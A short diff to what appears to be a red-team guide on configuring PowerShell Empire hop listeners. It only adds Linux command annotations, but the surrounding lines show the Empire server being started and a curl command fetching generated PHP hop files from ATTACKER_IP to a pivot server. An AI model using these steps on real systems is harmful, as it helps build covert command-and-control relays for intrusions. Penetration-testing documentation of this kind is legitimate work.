@@ -20,6 +20,7 @@ Empire hop listeners proxy agent traffic through an intermediate web server when
 
 Start Empire:
 
+<!-- cmd: linux -->
 ```bash
 sudo powershell-empire server
 powershell-empire client
@@ -47,6 +48,7 @@ RedirectListener: Listener-WEB-200
 
 Transfer generated PHP hop files to the pivot and serve them:
 
+<!-- cmd: linux -->
 ```bash
 sudo python3 -m http.server 80
 curl http://ATTACKER_IP/http_hop/admin/get.php -o admin/get.php
